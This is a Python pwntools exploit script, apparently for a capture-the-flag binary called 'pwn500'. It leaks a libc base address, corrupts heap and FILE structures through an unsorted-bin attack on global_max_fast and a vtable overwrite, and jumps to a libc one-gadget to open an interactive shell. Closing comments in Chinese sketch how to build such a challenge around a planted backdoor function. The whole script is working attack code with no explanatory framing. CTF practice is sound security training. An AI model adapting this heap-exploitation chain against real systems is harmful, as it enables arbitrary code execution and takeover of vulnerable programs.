# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './pwn500'
e = ELF(file)
libc = e.libc
rlibc = ''
ip = ''
port = ''
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.attach(p, code)


def run(local):
    global p, libc, debug
    if local == 1:
        p = process(file)
        libc = e.libc
        debug = True
    else:
        p = remote(ip, port)
        libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run(1)

sla(':\n', '4')
sla(':', '1')
sla(':', 'a' * 0x28)
ru('a' * 0x28)
libc.address = un64(rn(6)) - 16 - libc.symbols['atoi']
success(hex(libc.address))

sla(':', '5')
sla(':', '3')
sla('advise', '1')
sla(':', '6064')
sla('advise', '4')

sla(':', '1')
sla(':', '2')
sla(':', '4')
sea(':', p64(0) * 3 + p64(libc.address + 0x3c67f8 - 0x10))
sla(':', '3')
'''
sla(':', '4')
sla('Input:', p64(libc.symbols['system']))
'''
sla(':', '5')
sla(':', '3')
sla('advise', '2')
sla('advise', p64(0) * 1 + p64(libc.address + 0x7a730) + p64(1) + p64(2) + p64(3) + p64(libc.address + 0x4526a) + p64(5) + p64(6) + p64(7) + p64(8))
dbg('b* ' + hex(libc.address + 0x4526a))
sla('advise', '3')
shell()

# 这里写一个vtable难以利用，可以考虑出题时写一个后门函数
'''
    出题：
    放一个后门函数，正常进入是十分难的，这里可以考虑弄一个check

    需要程序地址，考虑是否开启Pie
    然后通过unsortbin attack修改global_max_fast使得index溢出修改vtable为某函数地址，这里放一个限制性函数，比如任意地址写

    leak
    new一个大的
    magic任意地址写改global_max_fast，菜单中只能使用一次
    delete掉，放去了IOFILE
    vtable指向magic
    magic任意地址写拿shell
'''